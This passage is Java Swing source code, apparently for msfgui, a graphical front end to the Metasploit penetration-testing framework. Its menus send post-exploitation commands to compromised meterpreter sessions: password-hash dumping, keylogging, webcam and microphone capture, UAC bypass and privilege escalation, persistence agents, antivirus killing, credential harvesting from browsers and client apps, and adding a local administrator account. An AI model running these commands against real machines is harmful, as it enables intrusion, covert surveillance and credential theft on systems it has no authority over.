			Object[] vals = ((List)((Map)rpcConn.execute("db.workspaces")).get("workspaces")).toArray();
			Object[] names = new Object[vals.length];
			for(int i = 0; i < vals.length; i++)
				names[i] = ((Map)vals[i]).get("name");
			Object selected = JOptionPane.showInputDialog(getFrame(),"Select a workspace to delete","Workspace selection",
					JOptionPane.QUESTION_MESSAGE,null, names, MsfguiApp.workspace);
			if(selected == null)
				return;
			rpcConn.execute("db.del_workspace", selected.toString());
			if(MsfguiApp.workspace.equals(selected.toString())){
				MsfguiApp.workspace = "default";
				reloadDb(true);
			}
		} catch (MsfException mex) {
			MsfguiApp.showMessage(getFrame(), mex);
		}
	}//GEN-LAST:event_delWorkspaceItemActionPerformed

	private void refreshConsolesItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_refreshConsolesItemActionPerformed
		refreshConsoles();
	}//GEN-LAST:event_refreshConsolesItemActionPerformed

	private void jobViewItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_jobViewItemActionPerformed
		DraggableTabbedPane.show(jobsPane);
	}//GEN-LAST:event_jobViewItemActionPerformed

	private void sessionsViewItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_sessionsViewItemActionPerformed
		DraggableTabbedPane.show(sessionsPane);
	}//GEN-LAST:event_sessionsViewItemActionPerformed

	private void hostsViewItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_hostsViewItemActionPerformed
		DraggableTabbedPane.show(hostsPane);
	}//GEN-LAST:event_hostsViewItemActionPerformed

	private void clientsViewItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_clientsViewItemActionPerformed
		DraggableTabbedPane.show(clientsPane);
	}//GEN-LAST:event_clientsViewItemActionPerformed

	private void servicesViewItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_servicesViewItemActionPerformed
		DraggableTabbedPane.show(servicesPane);
	}//GEN-LAST:event_servicesViewItemActionPerformed

	private void vulnsViewItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_vulnsViewItemActionPerformed
		DraggableTabbedPane.show(vulnsPane);
	}//GEN-LAST:event_vulnsViewItemActionPerformed

	private void eventsViewItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_eventsViewItemActionPerformed
		DraggableTabbedPane.show(eventsPane);
	}//GEN-LAST:event_eventsViewItemActionPerformed

	private void notesViewItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_notesViewItemActionPerformed
		DraggableTabbedPane.show(notesPane);
	}//GEN-LAST:event_notesViewItemActionPerformed

	private void credsViewItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_credsViewItemActionPerformed
		DraggableTabbedPane.show(credsPane);
	}//GEN-LAST:event_credsViewItemActionPerformed

	private void lootsViewItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_lootsViewItemActionPerformed
		DraggableTabbedPane.show(lootsPane);
	}//GEN-LAST:event_lootsViewItemActionPerformed

	private void nmapItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_nmapItemActionPerformed
		//Get db_nmap options
		String opts = JOptionPane.showInputDialog(getFrame(),"Enter arguments to nmap",
				"db_nmap options",JOptionPane.QUESTION_MESSAGE);
		if(opts == null)
			return;
		//Start console
		Map res = (Map) rpcConn.execute("console.create");
		registerConsole(res, true, InteractWindow.runCmdWindow(rpcConn, res, "db_nmap "+opts));
	}//GEN-LAST:event_nmapItemActionPerformed

	private void viewPrefsItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_viewPrefsItemActionPerformed
		new PreferencesFrame().setVisible(true);
	}//GEN-LAST:event_viewPrefsItemActionPerformed

	private void dbExportItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_dbExportItemActionPerformed
		try {
			Object filetype = JOptionPane.showInputDialog(getFrame(), "Select file type. ",
					"Type selection", JOptionPane.PLAIN_MESSAGE,null, new Object[]{"XML","pwdump"}, "XML");
			if(filetype == null)
				return;
			String type = filetype.toString().toLowerCase();
			HashMap argHash = new HashMap();
			if (MsfguiApp.fileChooser.showSaveDialog(getFrame()) == javax.swing.JFileChooser.CANCEL_OPTION)
				return;
			Map res = (Map) rpcConn.execute("console.create");
			registerConsole(res, true, InteractWindow.runCmdWindow(rpcConn, res,
					"db_export -f "+type+" "+MsfguiApp.escapeBackslashes(
					MsfguiApp.fileChooser.getSelectedFile().getCanonicalPath())));
		} catch (MsfException mex) {
			MsfguiApp.showMessage(getFrame(), mex);
		} catch (IOException iex) {
			MsfguiApp.showMessage(getFrame(), iex);
		}
	}//GEN-LAST:event_dbExportItemActionPerformed

	private void crackPasswordsItemActionPerformed(java.awt.event.ActionEvent evt) {//GEN-FIRST:event_crackPasswordsItemActionPerformed
		MsfguiApp.runModule("auxiliary", "analyze/jtr_crack_fast", new HashMap(), rpcConn, this, true);
	}//GEN-LAST:event_crackPasswordsItemActionPerformed

	/** Runs command on all current meterpreter sessions in new thread; posting updates for each thread */
	private void runOnAllMeterpreters(String cmd, String output, JLabel outputLabel) {
		SessionCommand.runOnAllMeterpreters(sessionsTableModel, cmd, output, outputLabel, rpcConn);
	}

   /** Displays a dialog to connect to msfrpcd. */
	private void connectRpc() {
		//make new rpcConnection
		rpcConn = OpenConnectionDialog.getConnection(this);
	}

   /** Attempts to start msfrpcd and connect to it.*/
	@Action
	public Task startRpc() {
		return RpcConnection.startRpcConn(this);
	}
	public void showInteractWindow() {
		for(Map session : selectedSessions)
			DraggableTabbedPane.show((Component)sessionWindowMap.get(session.get("id")+"console"));
	}
	/* Master function to setup popup menus for jobs and sessions
	 * First handles jobs, then shell sessions, then meterpreter sessions,
	 * and finally other sessions (like VNC).
	 */
	private void setupPopupMenus() throws HeadlessException {
		//JOB POPUP MENUS
		jobPopupMenu = new JPopupMenu();
		addSessionItem("Info",jobPopupMenu,new RpcAction() {
			public void action() throws Exception {
				Object obj = rpcConn.execute("job.info", clickedJob);
				if(obj instanceof Map && ((Map)obj).containsKey("info"))
					obj = ((Map)obj).get("info");
				(new JobInfoPopup(null, true, obj)).setVisible(true);
			}
		});
		addSessionItem("Stop",jobPopupMenu,new RpcAction() {
			public void action() throws Exception {
				if(!"success".equals(((Map)rpcConn.execute("job.stop", clickedJob)).get("result")))
					MsfguiApp.showMessage(null, "stop failed.");
			}
		});
		jobsList.addMouseListener( new PopupMouseListener() {
			public void mouseReleased(MouseEvent e){
				super.mouseReleased(e);
				int indx = jobsList.locationToIndex(e.getPoint());
				if (indx == -1)
					return;
				jobsList.setSelectedIndex(indx);
				clickedJob = jobsList.getSelectedValue().toString().split(" ")[0];
				if(e.getClickCount() > 1){
					Object obj = rpcConn.execute("job.info", clickedJob);
					if(obj instanceof Map && ((Map)obj).containsKey("info"))
						obj = ((Map)obj).get("info");
					(new JobInfoPopup(null, true, obj)).setVisible(true);
				}
			}
			public void showPopup(MouseEvent e) {
				jobPopupMenu.show(jobsList, e.getX(), e.getY() );
			}
		});
		//SESSION POPUP MENUS
		sessionsTable.addMouseListener(new PopupMouseListener() {
			public void doubleClicked(MouseEvent e){
				getSelected();
				showInteractWindow();//show interaction window on double-click
			}
			private void getSelected() {
				int[] selrows = sessionsTable.getSelectedRows();
				selectedSessions = new HashMap[selrows.length];
				for (int i = 0; i < selrows.length; i++) 
					selectedSessions[i] = (Map) sessionsTableModel.getSessionList().get(selrows[i]);
			}
			public void showPopup(MouseEvent e) {
				getSelected();
				if(selectedSessions.length == 0) //must have a row selected
					return;
				Map session = selectedSessions[0];
				if (session.get("type").equals("shell"))
					shellPopupMenu.show(e.getComponent(), e.getX(), e.getY());
				else if (session.get("type").equals("meterpreter"))
					meterpreterPopupMenu.show(e.getComponent(), e.getX(),e.getY());
				else
					sessionPopupMenu.show(e.getComponent(), e.getX(),e.getY());
			}
		});

		//Setup shell popup menu
		shellPopupMenu = new JPopupMenu();
		addSessionItem("Interact",shellPopupMenu,null);
		addSessionItem("Upgrade",shellPopupMenu,new RpcAction(this) {
			String[] vals = null;
			public void prepare() throws Exception {
				vals = JOptionPane.showInputDialog(getFrame(), "Select host/port for connect back.",
						MsfguiApp.getLocalIp()+":4444").split(":");
				if(vals == null)
					throw new MsfException("cancelled");
			}
			public void action(Map session) throws Exception {
				rpcConn.execute("session.shell_upgrade", session.get("id"), vals[0], vals[1]);
			}
		});
		addSessionKillItem(shellPopupMenu);

		//Setup meterpreter menu
		meterpreterPopupMenu = new JPopupMenu();
		addSessionItem("Access Filesystem",meterpreterPopupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				MeterpFileBrowser.showBrowser(rpcConn, session, sessionWindowMap);
			}
		});
		addSessionItem("Processes",meterpreterPopupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				ProcessList.showList(rpcConn,session,sessionWindowMap);
			}
		});
		addSessionItem("Shell",meterpreterPopupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				rpcConn.execute("session.meterpreter_write", session.get("id"),"shell\n");
			}
		});
		addSessionItem("Console",meterpreterPopupMenu,null);
		addScript("Get hashes",meterpreterPopupMenu,
				"multi_console_command -cl \"use priv\",\"getsystem\",\"run post/windows/gather/hashdump\"");
		addSessionItem("Route through this session",meterpreterPopupMenu,new AutorouteOptionsDialog(this, true));
		addScript("Schedule command",meterpreterPopupMenu,new ScheduleTaskOptionsDialog(getFrame()));
		addSessionItem("Unlock screen",meterpreterPopupMenu,"screen_unlock");
		addScript("Upload + execute",meterpreterPopupMenu,new UploadexecOptionsDialog(getFrame()));
		addSessionItem("Ping/DNS sweep",meterpreterPopupMenu,new NetenumOptionsDialog(getFrame()));
		addSessionItem("ARP sweep",meterpreterPopupMenu,new Object(){
			public String toString(){
				String target = JOptionPane.showInputDialog(getFrame(),
						"Enter Target list as address or CIDR","Enter Target", JOptionPane.QUESTION_MESSAGE);
				if(target == null)
					throw new RuntimeException("cancelled");
				return "arp_scanner.rb -r "+ target;
			}
		});
		addScript("Run shell commands",meterpreterPopupMenu,new MulticommandOptionsDialog(getFrame()));
		addSessionItem("VirtualBox sysenter DoS",meterpreterPopupMenu,"virtualbox_sysenter_dos");

		JMenu monitorMenu = new JMenu("Monitor");
		meterpreterPopupMenu.add(monitorMenu);
		addScript("Start keylogger",monitorMenu,"post/windows/capture/keylog_recorder");
		addScript("Start packet recorder",monitorMenu,"packetrecorder");
		addScript("Screenshot",monitorMenu,"multi_console_command -cl \"screenshot\"");
		addSessionItem("View webcam",monitorMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				WebcamFrame.showWebcam(rpcConn,session,sessionWindowMap);
			}
		});
		addScript("Record Microphone",monitorMenu,new Object(){
			public String toString(){
				return "sound_recorder.rb "+JOptionPane.showInputDialog(getFrame(), "Number of 30 second intervals to record","20");
			}
		});

		JMenu escalateMenu = new JMenu("Privilege escalation");
		meterpreterPopupMenu.add(escalateMenu);
		addScript("Bypass UAC", escalateMenu, "post/windows/escalate/bypassuac");
		addScript("Getsystem via windows API or KiTrap0D exploit",escalateMenu,
				"multi_console_command -cl \"use priv\",\"getsystem\"");
		addSessionItem("Find and exploit weak service permissions",escalateMenu,
				"service_permissions_escalate");
		addSessionItem("MS10-092 task scheduler",escalateMenu,"post/windows/escalate/schelevator");
		addSessionItem("HP PML Driver permissions",escalateMenu,"pml_driver_config");
		addSessionItem("Panda Antivirus permissions",escalateMenu,"panda_2007_pavsrv51");
		addSessionItem("SRT WebDrive permissions",escalateMenu,"srt_webdrive_priv");
		addSessionItem("Brute force user/pass",escalateMenu,new WinbfOptionsDialog(getFrame()));

		JMenu accessMenu = new JMenu("Maintaining access");
		meterpreterPopupMenu.add(accessMenu);
		addScript("Install metsvc (listening agent)", accessMenu,"metsvc.rb");
		addScript("Run persistence (connect back agent)",accessMenu,new PersistenceOptionsDialog(getFrame()));
		addSessionItem("Open VNC",accessMenu,"vnc.rb -i");
		addScript("Setup RDP",accessMenu,new Object(){
			public String toString(){
				return "getgui.rb "+UserPassDialog.getUserPassOpts(getFrame());
			}
		});
		addScript("Setup telnet",accessMenu,new Object(){
			public String toString(){
				return "gettelnet.rb "+UserPassDialog.getUserPassOpts(getFrame());
			}
		});
		addSessionItem("Add admin user",accessMenu,new Object(){
			public String toString(){
				String[] userPass = UserPassDialog.showUserPassDialog(getFrame());
				return "multicommand -cl \"net user "+userPass[0]+" "+userPass[1]+" /ADD\"" +
						",\"net localgroup Administrators "+userPass[0]+" /ADD\"";
			}
		});
		addScript("Kill AV",accessMenu,"killav");
		addScript("Duplicate",accessMenu,"duplicate");

		JMenu infoPopupMenu = new JMenu("System Information");
		meterpreterPopupMenu.add(infoPopupMenu);
		addSessionItem("Check if in VM",infoPopupMenu,"post/windows/gather/checkvm");
		addSessionItem("VMWare configurations",infoPopupMenu,"enum_vmware");
		addSessionItem("Past and current logged on users", infoPopupMenu, "post/windows/gather/enum_logged_on_users");
		addSessionItem("Domain admins",infoPopupMenu,"domain_list_gen");
		addSessionItem("Recent documents",infoPopupMenu,"dumplinks -e");
		addSessionItem("Recent programs (by prefetch)",infoPopupMenu,"prefetchtool -p -i");
		addSessionItem("Installed programs",infoPopupMenu,"post/windows/gather/enum_applications");
		addSessionItem("Countermeasures",infoPopupMenu,
				"multi_console_command -cl \"run getcountermeasure -h\",\"run getcountermeasure\"");
		addSessionItem("Environment variables",infoPopupMenu,"post/multi/gather/env");
		addSessionItem("Powershell Environment",infoPopupMenu,"post/windows/gather/enum_powershell_env");
		addSessionItem("SNMP",infoPopupMenu,"post/windows/gather/enum_snmp");
		addSessionItem("Subnets",infoPopupMenu,"get_local_subnets");
		addSessionItem("Firefox credentials and profile info", infoPopupMenu, "enum_firefox");
		addSessionItem("Google Chrome info", infoPopupMenu, "enum_chrome");
		addSessionItem("Pidgin credentials",infoPopupMenu,
				"multi_console_command -cl \"run get_pidgin_creds -h\",\"run get_pidgin_creds\"");
		addSessionItem("Filezilla credentials",infoPopupMenu,"get_filezilla_creds");
		addSessionItem("VNC credentials",infoPopupMenu,"getvncpw");
		addSessionItem("Putty credentials",infoPopupMenu,"enum_putty");
		addSessionItem("Shares",infoPopupMenu,"post/windows/gather/enum_shares");
		addSessionItem("winenum: env vars, interfaces, routing, users, processes, tokens...",infoPopupMenu,"winenum");
		addSessionItem("Remote winenum: most of the above run against a different system",infoPopupMenu,
				new RemoteWinenumOptionsDialog(getFrame()));

		addSessionItem("Other",meterpreterPopupMenu,new RpcAction(this) {
			String command = null;
			public void prepare() throws Exception {
				command = JOptionPane.showInputDialog(getFrame(),
						"Enter a command","Run command on selected meterpreter sessions", JOptionPane.QUESTION_MESSAGE);
				if(command == null)
					throw new MsfException("cancelled");
			}
			public void action(Map session) throws Exception {
				rpcConn.execute("session.meterpreter_run_single", session.get("id"),command);
			}
		});
		addSessionKillItem(meterpreterPopupMenu);
		
		//Setup generic menu (for vnc or whatever other sessions)
		sessionPopupMenu = new JPopupMenu();
		addSessionKillItem(sessionPopupMenu);
	}
	/** Adds a named session menu item to a given popup menu */
	private void addSessionItem(String name, JComponent menu,ActionListener action) {
		if(action == null)
			action = new RpcAction(null,this);
		JMenuItem tempItem = new JMenuItem(name);
		menu.add(tempItem);
		tempItem.addActionListener(action);
	}
	/** Adds a named session menu item to a given popup menu */
	private void addSessionItem(String name, JComponent menu, Object action){
		addSessionItem(name, menu, new RpcAction(action,this));
	}
	/** Adds a named session menu item to both a given popup menu and the run on all menu */
	private void addScript(final String name, JComponent menu, final Object action){
		addSessionItem(name,menu,action);
		JMenuItem menuItem = new JMenuItem(name);
		menuItem.setName(name);
		menuItem.addActionListener(new ActionListener() {
			public void actionPerformed(ActionEvent evt) {
				runOnAllMeterpreters("run "+action.toString(),name,statusMessageLabel);
			}
		});
		menuRunAllMeterp.add(menuItem);
	}
	/** Adds a kill session menu item to a given popup menu */
	private void addSessionKillItem(JComponent popupMenu) throws HeadlessException {
		addSessionItem("Kill session",popupMenu,new RpcAction(this) {
			public void action(Map session) throws Exception {
				rpcConn.execute("session.stop", session.get("id"));
			}
		});
	}
	
    // Variables declaration - do not modify//GEN-BEGIN:variables
    private javax.swing.JMenuItem addWorkspaceItem;
    private javax.swing.JMenuItem autoAddRouteItem;
    private javax.swing.JMenu auxiliaryMenu;
    private javax.swing.JMenuItem clearHistoryItem;
    private javax.swing.JScrollPane clientsPane;
    private javax.swing.JTable clientsTable;
    private javax.swing.JMenuItem clientsViewItem;
    private javax.swing.JMenu closeConsoleMenu;
    private javax.swing.JMenuItem connectItem;
    private javax.swing.JMenuItem connectRpcMenuItem;
    private javax.swing.JMenu consoleMenu;
    private javax.swing.JMenuItem crackPasswordsItem;
    private javax.swing.JScrollPane credsPane;
    private javax.swing.JTable credsTable;
    private javax.swing.JMenuItem credsViewItem;
    private javax.swing.JMenuItem currWorkspaceItem;
    private javax.swing.JMenu databaseMenu;
    private javax.swing.JMenuItem dbCredcollectItem;
    private javax.swing.JMenuItem dbExportItem;
    private javax.swing.JMenuItem dbTrackerItem;
    private javax.swing.JMenuItem delWorkspaceItem;
    private javax.swing.JMenuItem disconnectItem;
    private javax.swing.JMenuItem eventsViewItem;
    private javax.swing.JMenu existingConsoleMenu;
    private javax.swing.JMenu exploitsMenu;
    private javax.swing.JMenu helpMenu;
    private javax.swing.JMenu historyMenu;
    private javax.swing.JScrollPane hostsPane;
    private javax.swing.JTable hostsTable;
    private javax.swing.JMenuItem hostsViewItem;
    private javax.swing.JMenuItem importItem;
    private javax.swing.JMenuItem ipsFilterItem;
    private javax.swing.JPopupMenu.Separator jSeparator1;
    private javax.swing.JMenuItem jobViewItem;
    private javax.swing.JList jobsList;
    private javax.swing.JScrollPane jobsPane;
    private javax.swing.JMenuItem killSessionsMenuItem;
    private javax.swing.JMenuItem logGenerateMenuItem;
    private javax.swing.JScrollPane lootsPane;
    private javax.swing.JTable lootsTable;
    private javax.swing.JMenuItem lootsViewItem;
    private javax.swing.JPanel mainPanel;
    private javax.swing.JMenuBar menuBar;
    private javax.swing.JMenu menuRunAllMeterp;
    private javax.swing.JMenuItem newConsoleItem;
    private javax.swing.JMenuItem nmapItem;
    private javax.swing.JScrollPane notesPane;
    private javax.swing.JTable notesTable;
    private javax.swing.JMenuItem notesViewItem;
    private javax.swing.JMenuItem onlineHelpMenu;
    private javax.swing.JMenuItem otherPluginItem;
    private javax.swing.JMenu payloadsMenu;
    private javax.swing.JMenu pluginsMenu;
    private javax.swing.JMenu postMenu;
    private javax.swing.JProgressBar progressBar;
    public javax.swing.JMenu recentMenu;
    private javax.swing.JMenuItem refreshConsolesItem;
    private javax.swing.JMenuItem refreshItem;
    private javax.swing.JMenuItem searchItem;
    private javax.swing.JScrollPane servicesPane;
    private javax.swing.JTable servicesTable;
    private javax.swing.JMenuItem servicesViewItem;
    private javax.swing.JScrollPane sessionsPane;
    private javax.swing.JTable sessionsTable;
    private javax.swing.JMenuItem sessionsViewItem;
    private javax.swing.JMenuItem showDetailsItem;
    private javax.swing.JMenuItem socketLoggerItem;
    private javax.swing.JMenuItem soundItem;
    private javax.swing.JMenuItem startRpcMenuItem;
    public javax.swing.JLabel statusAnimationLabel;
    javax.swing.JLabel statusMessageLabel;
    private javax.swing.JPanel statusPanel;
    public javax.swing.JTabbedPane tabbedPane;
    private javax.swing.JMenuItem unloadPluginItem;
    private javax.swing.JMenu viewMenu;
    private javax.swing.JMenuItem viewPrefsItem;
    private javax.swing.JScrollPane vulnsPane;
    private javax.swing.JTable vulnsTable;
    private javax.swing.JMenuItem vulnsViewItem;
    // End of variables declaration//GEN-END:variables
	private final Timer messageTimer;
	private final Timer busyIconTimer;
	private final Icon idleIcon;
	private final Icon[] busyIcons = new Icon[15];
	private int busyIconIndex = 0;
	private JDialog aboutBox;
}
